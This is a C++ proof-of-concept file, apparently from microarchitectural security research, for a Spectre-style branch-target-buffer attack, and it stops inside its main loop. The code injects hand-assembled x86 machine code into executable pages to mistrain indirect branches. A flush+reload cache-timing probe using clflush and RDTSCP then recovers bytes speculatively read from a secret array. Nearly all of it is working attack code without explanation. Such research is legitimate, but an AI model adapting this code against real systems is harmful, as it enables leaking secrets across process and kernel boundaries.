// test replacement BTB
#include <cstdio>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <string.h>

typedef unsigned int uint32_t;
typedef unsigned long long int uint64_t;

char buf[128];
char mem[64];

unsigned char probeArray[0x180011000];
unsigned char secretArray[65536];


// ---------------------------------------------------------------------------
void flush(void *p) { asm volatile("clflush 0(%0)\n"
                                   :
                                   : "c"(p)
                                   : "rax"); }

void mfence() { asm volatile("mfence"); }

void cpuid() { asm volatile("CPUID"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n"
                                     :
                                     : "c"(p)
                                     : "rax"); }

// ---------------------------------------------------------------------------
void int3() { asm volatile("INT3"); }

// ---------------------------------------------------------------------------
void nospec() { asm volatile("lfence"); }

// converting int to double actually takes no time so it's not a problem
double start()
{
    unsigned long long a, d;
    asm volatile("mfence\n\t"
                 "CPUID\n\t"
                 "RDTSCP\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "mfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return (double)a;
}

double end()
{
    unsigned long long a, d;
    asm volatile("mfence\n\t"
                 "RDTSCP\n\t"
                 "mov %%rdx, %0\n\t"
                 "mov %%rax, %1\n\t"
                 "CPUID\n\t"
                 "mfence\n\t"
                 : "=r"(d), "=r"(a)
                 :
                 : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d << 32) | a;
    return (double)a;
}

double get_threshold() {
    double result = 0;
    void* p = (void*) (&probeArray[255 * 4096]);
    flush(p);
    mfence();
    double tt1 = start();
    asm volatile("movq (%0), %%rax\n"
                :
                : "c"(p)
                : "rax");
    double tt2 = end();
    double uncached = tt2 - tt1;
    double sum = 0;
    for (int i = 0; i < 100; i++) {
        tt1 = start();
        asm volatile("movq (%0), %%rax\n"
                    :
                    : "c"(p)
                    : "rax");
        tt2 = end();
        sum += tt2 - tt1;
    }

    result = sum / 100 * 0.9 + uncached * 0.1;
    return result;
}

inline void training(unsigned char* bp, uint32_t trainingP1, uint32_t trainingP2, uint32_t trainingP3, uint64_t trainingP4, void* trainingPageBase) {
    // 2. call the training function
    for (int i = 0; i < 100; i++) {
        asm volatile("movq %0, %%r15 \t\n\
                movq $0, %%r13 \t\n\
                movq %%rsp, %%r12 \t\n\
                andq $0xfffffffffffffff0, %%rsp \t\n\
                push %%r12 \t\n\
                subq $0x8, %%rsp \t\n\
                movl %1, %%edi \t\n\
                movl %2, %%esi \t\n\
                movl %3, %%edx \t\n\
                movq %4, %%rcx \t\n\
                callq *%5 \t\n\
                addq $0x8, %%rsp \t\n\
                pop %%rsp \t\n\
                "
                :
                : "g"(bp), "g"(trainingP1), "g"(trainingP2), "g"(trainingP3), "g"(trainingP4), "g"(trainingPageBase)
                : "rdi", "esi", "edx", "rcx", "r12", "rax", "r15", "rbx", "r11", "r13");
    }
}

void my_memcpy(unsigned char* dest, unsigned char* src, size_t length) {
    for (size_t i = 0; i < length; i++) {
        dest[i] = src[i];
    }
}

#define UP 0
#define DOWN 1
uint64_t roundVal(uint64_t numToRound, uint64_t multiple, uint64_t roundDirection)
{
    if (multiple == 0)
        return numToRound;

    uint64_t remainder = numToRound % multiple;
    if (remainder == 0)
        return numToRound;

    if (roundDirection == UP) {
        return numToRound + multiple - remainder;
    } else {
        return numToRound - remainder;
    }
}


int copycode(void* dest_address, const void* src_address, int size)
{
    const void* dest_end = (char*) dest_address + size;

    char* aligned_dest_start = (char*) roundVal((uint64_t) dest_address, 4096, DOWN);
    char* aligned_dest_end = (char*) roundVal((uint64_t) dest_address + size, 4096, UP);
    const unsigned int copy_size = aligned_dest_end - aligned_dest_start;

    void* mapped = mmap(aligned_dest_start, copy_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if(mapped == MAP_FAILED) {
        perror("mmap failed: ");
        return -1;
    }
    memcpy(dest_address, src_address, size);
    return 0;
}

int main()
{
    // getc(stdin);
    printf("probeArray: %p \nsecretArray: %p \n", probeArray, secretArray);
    for (unsigned int i = 0; i < 65536; i++) {
        secretArray[i] = i % 254 + 2;   // see 4
    }
    for (uint64_t i = 0; i < 0x180011000; i++) {
        probeArray[i] = i % 256;
    }
    double cacheThreshold = get_threshold();
    printf("threshold: %f \n", cacheThreshold);
    uint64_t totalTime = 0;
    uint64_t successTime = 0;
    void* pageBase = mmap(NULL, (1 << 20), PROT_EXEC |  PROT_READ | PROT_WRITE,  MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    void* trainingPageBase = pageBase;
    if (trainingPageBase == (void *)-1) {
        perror("mmap failed: ");
        exit(1);
    }
    printf("trainingPageBase: %p \n", trainingPageBase);
    // trainingPageBase = (void *) ((unsigned char *)trainingPageBase + 0xfb2c);
    unsigned char* bp = probeArray;
    size_t alignment = 0;
    size_t mutatedDigit = 0;
    while (1)
    {
        totalTime = 0;
        successTime = 0;
        trainingPageBase = (void *) ((unsigned char *)trainingPageBase + alignment);
        for (size_t gi = 0; gi < 100000; gi++) {
            flush(&secretArray[256]);
            // printf("Iteration %llu started \n", totalTime);
            totalTime++;
            trainingPageBase = pageBase;

            // 1. initialize the trainging bytes
            unsigned char trainingBytes[869] = {
                0x41    ,0x56    ,0x55    ,0x48    ,0x8b    ,0xec    ,0x83    ,0xff
                ,0x01    ,0x0f    ,0x84    ,0xf9    ,0x02    ,0x00    ,0x00    ,0x83
                ,0xfa	,0x01	,0x0f	,0x85	,0x20	,0x00	,0x00	,0x00
                ,0x41	,0xc7	,0x47	,0x29	,0x14	,0x00	,0x00	,0x00
                ,0x41	,0xc7	,0x47	,0x2a	,0x15	,0x00	,0x00	,0x00
                ,0x41	,0xc7	,0x47	,0x2b	,0x16	,0x00	,0x00	,0x00
                ,0x41	,0xc7	,0x47	,0x2c	,0x17	,0x00	,0x00	,0x00

                ,0x83    ,0xfa    ,0x03    ,0x0f    ,0x85    ,0x08    ,0x00
                ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00 //0df
                ,0x00    ,0x00    ,0x83    ,0xfa    ,0x04    ,0x0f    ,0x85    ,0x08
                ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14
                ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x05    ,0x0f    ,0x85
                ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29
                ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x06    ,0x0f
                ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47
                ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x07
                ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7
                ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa
                ,0x08    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41
                ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83
                ,0xfa    ,0x09    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00
                ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00
                ,0x83    ,0xfa    ,0x0a    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00
                ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00
                ,0x00    ,0x83    ,0xfa    ,0x0b    ,0x0f    ,0x85    ,0x08    ,0x00
                ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00
                ,0x00    ,0x00    ,0x83    ,0xfa    ,0x0c    ,0x0f    ,0x85    ,0x08
                ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14
                ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x0d    ,0x0f    ,0x85
                ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29
                ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x0e    ,0x0f
                ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47
                ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x0f
                ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7
                ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa
                ,0x10    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41
                ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83
                ,0xfa    ,0x11    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00
                ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00
                ,0x83    ,0xfa    ,0x12    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00
                ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00
                ,0x00    ,0x83    ,0xfa    ,0x13    ,0x0f    ,0x85    ,0x08    ,0x00
                ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00
                ,0x00    ,0x00    ,0x83    ,0xfa    ,0x14    ,0x0f    ,0x85    ,0x08
                ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14
                ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x15    ,0x0f    ,0x85
                ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29
                ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x16    ,0x0f
                ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47
                ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x17
                ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7
                ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa
                ,0x18    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41
                ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83
                ,0xfa    ,0x19    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00
                ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00
                ,0x83    ,0xfa    ,0x1a    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00
                ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00
                ,0x00    ,0x83    ,0xfa    ,0x1b    ,0x0f    ,0x85    ,0x08    ,0x00
                ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00
                ,0x00    ,0x00    ,0x83    ,0xfa    ,0x1c    ,0x0f    ,0x85    ,0x08
                ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14
                ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x1d    ,0x0f    ,0x85
                ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47    ,0x29
                ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x1e    ,0x0f
                ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7    ,0x47
                ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa    ,0x1f
                ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41    ,0xc7
                ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83    ,0xfa
                ,0x20    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00    ,0x41
                ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00    ,0x83
                ,0xfa    ,0x21    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00    ,0x00
                ,0x41    ,0xc7    ,0x47    ,0x29    ,0x14    ,0x00    ,0x00    ,0x00
                ,0x83    ,0xfa    ,0x22    ,0x0f    ,0x85    ,0x08    ,0x00    ,0x00
                ,0x00    ,0x41	,0xc7	,0x47	,0x29	,0x14	,0x00	,0x00	,0x00
                ,0x41	,0xc7	,0x47	,0x19	,0x2b	,0x00	,0x00	,0x00
                ,0x41	,0x8b	,0x47	,0x28	,0x66	,0x0f	,0x1f	,0x44
                ,0x00	,0x00	,0x66	,0x0f	,0x1f	,0x44	,0x00	,0x00
                ,0x90 ,0x90 ,0x83 ,0xfa ,0x2a	,0x0f	,0x84	,0x02
                ,0x00	,0x00	,0x00	,0x0f	,0x0b	,0x8b	,0xc6	,0x83
                ,0xf8	,0x04	,0x0f	,0x83	,0x0d	,0x00	,0x00	,0x00
                ,0x48	,0xbb	,0xb8	,0xa3	,0x8c	,0xe9	,0x3e	,0x29
                ,0x00	,0x00   ,0xff    ,0x24    ,0xc3    ,0x8b    ,0xc2    ,0xe9
                ,0x40    ,0x00    ,0x00    ,0x00    ,0x41    ,0x8b    ,0x47    ,0x2c
                ,0x41    ,0x8b    ,0x47    ,0x2d    ,0x41    ,0x8b    ,0x47    ,0x2e
                ,0x83    ,0xe8    ,0x0a    ,0x41    ,0xc7    ,0x04    ,0x07    ,0x14
                ,0x00    ,0x00    ,0x00    ,0x41    ,0x8b    ,0x5f    ,0x35    ,0x8b
                ,0xc3    ,0x83    ,0xf8    ,0x04    ,0x0f    ,0x83    ,0x0d    ,0x00
                ,0x00    ,0x00    ,0x48    ,0xbf    ,0xb0    ,0x94    ,0x45    ,0xdd
                ,0x16    ,0x0d    ,0x00    ,0x00    ,0x49    ,0x89
                ,0x4f    ,0x64    ,0x8b    ,0xc2    ,0x0f    ,0xaf    ,0xd6    ,0x03
                ,0xf0    ,0x8b    ,0xc2    ,0x2b    ,0xc6    ,0x41    ,0xc7    ,0x04
                ,0x07    ,0x0a    ,0x00    ,0x00    ,0x00    ,0x8b    ,0xc8    ,0x83
                ,0xc1    ,0x20    ,0x41    ,0xc7    ,0x04    ,0x0f    ,0x0a    ,0x00
                ,0x00    ,0x00    ,0x41    ,0x8b    ,0x0c    ,0x07    ,0x41    ,0x8b
                ,0x4c    ,0x0f    ,0x20    ,0x81    ,0xe1    ,0xff    ,0x00    ,0x00
                ,0x00    ,0xc1    ,0xe1    ,0x08    ,0x41    ,0x8b    ,0x0c    ,0x0f
                ,0x41    ,0x89    ,0x57    ,0x64    ,0x41    ,0x89    ,0x47    ,0x64
                ,0x5d    ,0x41    ,0x5e    ,0xc3    ,0xf4    ,0xf4    ,0xf4    ,0xf4
                ,0xde    ,0x93    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x0c    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x46    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x05    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x46    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x3f    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x88    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x88    ,0x94    ,0x45    ,0xdd    ,0x16    ,0x0d    ,0x00    ,0x00
                ,0x0f    ,0x0b    ,0xf4    ,0xf4    ,0xf4    ,0xf4    ,0xf4    ,0xf4
            };

            uint64_t* jmpTableAddr = (uint64_t*)(&trainingBytes[650]);
            jmpTableAddr[0] = (uint64_t)trainingPageBase + 0x31d;

            uint64_t* brTableEnty1 = (uint64_t*)(&trainingBytes[797]);
            brTableEnty1[0] = (uint64_t)trainingPageBase + 0x26e;
            brTableEnty1[1] = (uint64_t)trainingPageBase + 0x29c;
            brTableEnty1[2] = (uint64_t)trainingPageBase + 0x2cc; // correct this from 2d6 to 2cc
            brTableEnty1[3] = (uint64_t)trainingPageBase + 0x295;

            my_memcpy((unsigned char*)trainingPageBase, trainingBytes, 872);
            // memcpy(trainingPageBase, (void*)trainingBytes, 872);


            // 2. call the training function
            uint32_t trainingP1 = 0;
            uint32_t trainingP2 = 2;
            uint32_t trainingP3 = 42;
            uint64_t trainingP4 = 0;
            for (unsigned int ti = 0; ti < 100; ti++) {
                training(bp, trainingP1, trainingP2, trainingP3, trainingP4, trainingPageBase);
            }

            // 3. initialize the reading bytes
            trainingPageBase = (unsigned char*)trainingPageBase - 0x100000000;
            unsigned char* func_ptr = (unsigned char*)trainingPageBase;
            unsigned char readingBytes[784] =
            {
                0x41,	0x56,	0x55,	0x48,	0x8b,	0xec,	0x83,	0xfa
            ,   0x01,	0x0f,	0x85,	0x18,	0x00,	0x00,	0x00,	0x41
            ,   0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x41
            ,	0xc7,	0x47,	0x29,	0x15,	0x00,	0x00,	0x00,	0x41
            ,	0xc7,	0x47,	0x29,	0x16,	0x00,	0x00,	0x00,	0x83
            ,	0xfa,	0x02,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00
            ,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00
            ,	0x83,	0xfa,	0x03,	0x0f,	0x85,	0x08,	0x00,	0x00
            ,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00
            ,	0x00,	0x83,	0xfa,	0x04,	0x0f,	0x85,	0x08,	0x00
            ,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00
            ,	0x00,	0x00,	0x83,	0xfa,	0x05,	0x0f,	0x85,	0x08
            ,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14
            ,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x06,	0x0f,	0x85
            ,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29
            ,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x07,	0x0f
            ,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47
            ,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x08
            ,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7
            ,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa
            ,	0x09,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41
            ,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83
            ,	0xfa,	0x0a,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00
            ,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00
            ,	0x83,	0xfa,	0x0b,	0x0f,	0x85,	0x08,	0x00,	0x00
            ,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00
            ,	0x00,	0x83,	0xfa,	0x0c,	0x0f,	0x85,	0x08,	0x00
            ,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00
            ,	0x00,	0x00,	0x83,	0xfa,	0x0d,	0x0f,	0x85,	0x08
            ,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14
            ,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x0e,	0x0f,	0x85
            ,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29
            ,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x0f,	0x0f
            ,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47
            ,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x10
            ,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7
            ,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa
            ,	0x11,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41
            ,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83
            ,	0xfa,	0x12,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00
            ,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00
            ,	0x83,	0xfa,	0x13,	0x0f,	0x85,	0x08,	0x00,	0x00
            ,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00
            ,	0x00,	0x83,	0xfa,	0x14,	0x0f,	0x85,	0x08,	0x00
            ,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00
            ,	0x00,	0x00,	0x83,	0xfa,	0x15,	0x0f,	0x85,	0x08
            ,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14
            ,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x16,	0x0f,	0x85
            ,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29
            ,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x17,	0x0f
            ,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47
            ,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x18
            ,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7
            ,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa
            ,	0x19,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41
            ,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83
            ,	0xfa,	0x1a,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00
            ,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00
            ,	0x83,	0xfa,	0x1b,	0x0f,	0x85,	0x08,	0x00,	0x00
            ,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00
            ,	0x00,	0x83,	0xfa,	0x1c,	0x0f,	0x85,	0x08,	0x00
            ,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00
            ,	0x00,	0x00,	0x83,	0xfa,	0x1d,	0x0f,	0x85,	0x08
            ,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29,	0x14
            ,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x1e,	0x0f,	0x85
            ,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47,	0x29
            ,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x1f,	0x0f
            ,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x47
            ,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa,	0x20
            ,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41,	0xc7
            ,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83,	0xfa
            ,	0x21,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00,	0x41
            ,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00,	0x83
            ,	0xfa,	0x22,	0x0f,	0x85,	0x08,	0x00,	0x00,	0x00
            ,	0x41,	0xc7,	0x47,	0x29,	0x14,	0x00,	0x00,	0x00
            ,	0x41,	0xbb,	0xff,	0xff,	0xff,	0xff,	0x49,	0x03
            ,	0xcb,	0x41,	0x8b,	0x47,	0x28,	0x0f,	0x1f,	0x40
            ,	0x00,	0x0f,	0x1f,	0x80,	0x00,	0x00,	0x00,	0x00
            ,	0x41,	0x83,	0x7e,	0x38,	0x00,	0x0f,	0x84,	0x02
            ,	0x00,	0x00,	0x00,	0x0f,	0x0b,	0x8b,	0xc6,	0x83
            ,	0xf8,	0x04,	0x0f,	0x83,	0x14,	0x00,	0x00,	0x00
            ,	0x48,	0xbb,	0x90,	0x53,	0x9e,	0x60,	0x4e,	0x18
            ,	0x00,	0x00,	0xff,	0x24,	0xc3,	0x8b,	0xc2,	0xe9
            ,	0x06,	0x00,	0x00,	0x00,	0x49,	0x89,	0x4f,	0x64
            ,	0x8b,	0xc2,	0x0f,	0xaf,	0xd6,	0x03,	0xf0,	0x8b
            ,	0xc2,	0x2b,	0xc6,	0x41,	0xc7,	0x04,	0x07,	0x00
            ,	0x00,	0x00,	0x00,	0x41,	0xc7,	0x04,	0x07,	0x0a
            ,	0x00,	0x00,	0x00,	0x8b,	0xc8,	0x83,	0xc1,	0x20
            ,	0x41,	0xc7,	0x04,	0x0f,	0x0a,	0x00,	0x00,	0x00
            ,	0x41,	0x8b,	0x0c,	0x07,	0x41,	0x8b,	0x4c,	0x0f
            ,	0x20,	0x81,	0xe1,	0xff,	0x00,	0x00,	0x00,	0xc1
            ,	0xe1,	0x0c,	0x41,	0x8b,	0x0c,	0x0f,	0x41,	0x89
            ,	0x57,	0x64,	0x41,	0x89,	0x47,	0x64,	0x5d,	0x41
            ,	0x5e,	0xc3,	0xf4,	0xf4,	0xf4,	0xf4,	0xf4,	0xf4
            ,	0x05,	0x53,	0x9e,	0x60,	0x4e,	0x18,	0x00,	0x00
            ,	0x3c,	0x53,	0x9e,	0x60,	0x4e,	0x18,	0x00,	0x00
            ,	0x3c,	0x53,	0x9e,	0x60,	0x4e,	0x18,	0x00,	0x00
            ,	0x35,	0x53,	0x9e,	0x60,	0x4e,	0x18,	0x00,	0x00
            };

            jmpTableAddr = (uint64_t*)(&readingBytes[650]);
            jmpTableAddr[0] = (uint64_t)trainingPageBase + 0x2f0;

            readingBytes[624] = 0x49;
            readingBytes[625] = 0x83;
            readingBytes[626] = 0xfd;
            readingBytes[627] = 0x00;
            readingBytes[628] = 0x90;

            brTableEnty1 = (uint64_t*)(&readingBytes[752]);
            brTableEnty1[0] = (uint64_t)trainingPageBase + 0x265;
            brTableEnty1[1] = (uint64_t)trainingPageBase + 0x29C;
            brTableEnty1[2] = (uint64_t)trainingPageBase + 0x29c;
            brTableEnty1[3] = (uint64_t)trainingPageBase + 0x295;

            copycode((unsigned char*)trainingPageBase, readingBytes, 784);
            // memcpy(trainingPageBase, (void*)readingBytes, 784);

            // 4. call the reading function
            uint64_t offset0 = 4345;
            uint32_t index = 2;
            uint32_t temp = 42;
            uint64_t offset = 0x80011001 + 256 - 32;

            unsigned char *brp = ((unsigned char*)trainingPageBase + 0x2f0);
            asm volatile("clflush 0(%0)\n"
                                            :
                                            : "c"(brp)
                                            : "rax");
            asm volatile("clflush 0(%0)\n"
                                            :
                                            : "c"(brp + 0x8)
                                            : "rax");
            asm volatile("clflush 0(%0)\n"
                                            :
                                            : "c"(brp + 0x10)
                                            : "rax");
            asm volatile("clflush 0(%0)\n"
                                            :
                                            : "c"(brp + 0x18)
                                            : "rax");
            // flush(&secretArray[256]);
            // this page flush matters
            for(int m = 0; m < 256; m++) {
                asm volatile("clflush 0(%0)\n"
                                            :
                                            : "c"(bp + m * 4096)
                                            : "rax");
            }
            asm volatile("mfence");
            asm volatile("lfence");
            maccess(&secretArray[256]);
            maccess(&secretArray[256]);
            mfence();
            nospec();

            for (int i = 0; i < 10; i++) {
                asm volatile("movq %0, %%r15 \t\n\
                                movq $0, %%r13 \t\n\
                                movq %%rsp, %%r12 \t\n\
                                andq $0xfffffffffffffff0, %%rsp \t\n\
                                push %%r12 \t\n\
                                subq $0x8, %%rsp \t\n\
                                movq %1, %%rdi \t\n\
                                movl %2, %%esi \t\n\
                                movl %3, %%edx \t\n\
                                movq %4, %%rcx \t\n\
                                callq *%5 \t\n\
                                addq $0x8, %%rsp \t\n\
                                pop %%rsp \t\n\
                                "
                                :
                                : "g"(bp), "g"(offset0), "g"(index), "g"(temp), "g"(offset), "g"(trainingPageBase)
                                : "rdi", "esi", "edx", "rcx", "r12", "rax", "r15", "rbx", "r11", "r13");
            }


            // 5. measure
            // void *mp = (void*) (&bp[17*4096]);
            // void *zp = (void*) (&bp[0]);
            void *p = (void*) (&bp[0]);
            double tt1, tt2;
            // double t1, t2;
            // t1 = start();
            // asm volatile("movq (%0), %%rax\n"
            //             :
            //             : "c"(&secretArray[256])
            //             : "rax");
            // t2 = end();
            // if (t2 - t1 < 200) {successTime++;printf("latency secret: %f %llu %f%% %zu \n", t2 - t1, totalTime, 100 * (double)successTime/(double)totalTime, mutatedDigit);}
            // flush(&secretArray[256]);
            for (int i = 0; i < 256; i++) {
                int mix_i = (i * 167 + 13) & 255;
                p = (void*) (&bp[mix_i * 4096]);
                tt1 = start();
                asm volatile("movq (%0), %%rax\n"
                            :
                            : "c"(p)
                            : "rax");
                tt2 = end();

                if (tt2 - tt1 < cacheThreshold) {
                    if (mix_i != 0) {
                        successTime++;
                        printf("\033[0;31m");
                        printf("latency %d: %f %llu %f%% %zu \n", mix_i, tt2 - tt1, totalTime, 100 * (double)successTime/(double)totalTime, mutatedDigit);
                    }
                }
                flush(p);
            }
        }
        // alignment = 0x0a0 + (1 << mutatedDigit);
        // // alignment = 0x0a0 + (1 << 1) + (1 << 3) + (1 << 9) + (1 << 11) + (1 << 13) + (1 << 17) + (1 << 23) + (1 << 25);
        // mutatedDigit++;
